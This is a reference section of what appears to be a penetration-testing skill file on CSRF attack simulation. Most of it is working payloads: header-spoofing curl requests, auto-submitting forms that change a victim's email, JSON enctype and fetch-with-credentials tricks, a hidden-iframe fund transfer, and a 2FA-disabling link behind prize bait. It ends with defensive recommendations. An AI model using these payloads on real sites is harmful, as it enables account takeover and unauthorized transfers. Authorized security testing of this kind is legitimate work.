# performing-csrf-attack-simulation — 详细参考（由 SKILL.md 拆分）

# Send request with no Referer
curl -s -X POST \
  -b "session=abc123" \
  -H "Referer: " \
  -d "email=test@evil.com&csrf_token=valid_token" \
  "https://target.example.com/api/account/change-email" \
  -w "%{http_code}"

# Send request with evil Referer
curl -s -X POST \
  -b "session=abc123" \
  -H "Referer: https://evil.example.com/attack" \
  -d "email=test@evil.com&csrf_token=valid_token" \
  "https://target.example.com/api/account/change-email" \
  -w "%{http_code}"

# Send request with spoofed Origin
curl -s -X POST \
  -b "session=abc123" \
  -H "Origin: https://evil.example.com" \
  -d "email=test@evil.com" \
  "https://target.example.com/api/account/change-email" \
  -w "%{http_code}"
```

### Step 4: Generate CSRF Proof-of-Concept with Burp Suite

Use Burp's built-in CSRF PoC generator for rapid testing.

```
# In Burp Suite:
# 1. Right-click the target request in Proxy > HTTP History
# 2. Select "Engagement tools" > "Generate CSRF PoC"
# 3. Click "Test in browser" to validate the PoC

# Burp generates HTML like:
```

```html
<!-- Auto-submitting CSRF PoC for form-encoded POST -->
<html>
  <body>
    <h1>Loading...</h1>
    <form action="https://target.example.com/api/account/change-email"
          method="POST" id="csrf-form">
      <input type="hidden" name="email" value="attacker@evil.com" />
    </form>
    <script>
      document.getElementById('csrf-form').submit();
    </script>
  </body>
</html>
```

### Step 5: Craft Advanced CSRF Payloads

For JSON APIs and other non-standard content types, use advanced techniques.

```html
<!-- CSRF for JSON API using form with enctype -->
<html>
  <body>
    <form action="https://target.example.com/api/account/change-email"
          method="POST"
          enctype="text/plain"
          id="csrf-form">
      <input type="hidden"
             name='{"email":"attacker@evil.com","ignore":"'
             value='"}' />
    </form>
    <script>
      document.getElementById('csrf-form').submit();
    </script>
  </body>
</html>

<!-- CSRF via XMLHttpRequest (requires permissive CORS) -->
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.example.com/api/account/change-email", true);
xhr.setRequestHeader("Content-Type", "application/json");
xhr.withCredentials = true;
xhr.send(JSON.stringify({"email": "attacker@evil.com"}));
</script>

<!-- CSRF via fetch API -->
<script>
fetch("https://target.example.com/api/account/change-email", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body: "email=attacker@evil.com"
});
</script>

<!-- CSRF via image tag (GET-based state change) -->
<img src="https://target.example.com/api/account/delete?confirm=true"
     style="display:none" />

<!-- Multi-step CSRF with iframe -->
<iframe style="display:none" name="csrf-frame"></iframe>
<form action="https://target.example.com/api/transfer"
      method="POST" target="csrf-frame" id="csrf-form">
  <input type="hidden" name="to_account" value="attacker-account" />
  <input type="hidden" name="amount" value="1000" />
</form>
<script>document.getElementById('csrf-form').submit();</script>
```

### Step 6: Test and Validate the CSRF Attack

Host the PoC and confirm successful exploitation.

```bash
# Start a local web server to host the CSRF PoC
cd /tmp/csrf-poc
python3 -m http.server 8888

# PoC file structure:
# /tmp/csrf-poc/
#   index.html          <- CSRF PoC page
#   change-email.html   <- Email change CSRF
#   transfer.html       <- Fund transfer CSRF

# Testing steps:
# 1. Log in to target as victim user in Browser A
# 2. Open http://localhost:8888/change-email.html in Browser A
# 3. Check if the email was changed without victim's consent
# 4. Verify the state change in the application

# For SameSite=Lax bypass via top-level navigation:
# Use GET-based CSRF with window.open or anchor tag
```

```html
<!-- SameSite=Lax bypass using top-level navigation -->
<html>
  <body>
    <a href="https://target.example.com/api/settings?action=disable_2fa"
       id="csrf-link">Click here for a prize!</a>
    <script>
      // Automatic click via social engineering context
      // SameSite=Lax allows cookies on top-level GET navigations
    </script>
  </body>
</html>
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **CSRF** | Attack that tricks an authenticated user's browser into making unintended requests to a vulnerable site |
| **Anti-CSRF Token** | A unique, unpredictable value tied to the user's session that must be included in state-changing requests |
| **SameSite Cookie** | Browser attribute (Strict, Lax, None) controlling when cookies are sent in cross-site requests |
| **Origin Header** | HTTP header indicating the origin of the request, used for CSRF validation |
| **Referer Header** | HTTP header containing the URL of the referring page, sometimes used for CSRF checks |
| **Double Submit Cookie** | CSRF defense that compares a cookie value with a request parameter value |
| **Synchronizer Token Pattern** | Server generates and validates a unique token per session or per request |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **Burp Suite Professional** | CSRF PoC generator and request analysis |
| **OWASP ZAP** | Anti-CSRF token detection and CSRF testing |
| **XSRFProbe** | Automated CSRF vulnerability scanner (`pip install xsrfprobe`) |
| **Python http.server** | Local web server for hosting CSRF PoC pages |
| **Browser DevTools** | Inspecting cookies, SameSite attributes, and network requests |
| **CSRFTester (OWASP)** | Legacy tool for crafting and testing CSRF attacks |

## Common Scenarios

### Scenario 1: Email Change Without CSRF Token
The email change form does not include a CSRF token. An attacker hosts a page that auto-submits a form changing the victim's email to the attacker's address, enabling account takeover via password reset.

### Scenario 2: Fund Transfer with Token Bypass
The banking application has CSRF tokens but does not validate them if the parameter is omitted entirely. Removing the `csrf_token` field from the transfer form allows cross-site fund transfer.

### Scenario 3: JSON API CSRF via Content-Type Manipulation
A JSON API endpoint does not require a custom header. Using `enctype="text/plain"` in an HTML form, the attacker crafts a valid JSON body that changes the victim's account settings.

### Scenario 4: SameSite=Lax Bypass on GET State Change
A settings page changes state via GET request (`/settings?disable_2fa=true`). Since `SameSite=Lax` allows cookies on top-level GET navigations, linking the victim to this URL disables their 2FA.

## Output Format

```
## CSRF Vulnerability Finding

**Vulnerability**: Cross-Site Request Forgery (Email Change)
**Severity**: High (CVSS 8.0)
**Location**: POST /api/account/change-email
**OWASP Category**: A01:2021 - Broken Access Control

### Reproduction Steps
1. Authenticate as victim at https://target.example.com
2. Host the following HTML on an attacker-controlled server
3. Trick victim into visiting the attacker page while authenticated
4. The victim's email is changed to attacker@evil.com without consent

### Anti-CSRF Defenses Tested
| Defense | Present | Enforced |
|---------|---------|----------|
| CSRF Token | No | N/A |
| SameSite Cookie | Lax | Partial (GET bypass) |
| Origin Validation | No | N/A |
| Referer Validation | No | N/A |
| Custom Header Required | No | N/A |

### Impact
- Account takeover via email change + password reset chain
- Unauthorized fund transfers
- Settings modification (2FA disable, notification change)

### Recommendation
1. Implement synchronizer token pattern (anti-CSRF tokens) for all state-changing requests
2. Set SameSite=Strict on session cookies where possible
3. Validate Origin and Referer headers as defense-in-depth
4. Require re-authentication for sensitive operations (password change, fund transfer)
5. Use custom request headers (X-Requested-With) for AJAX endpoints
```
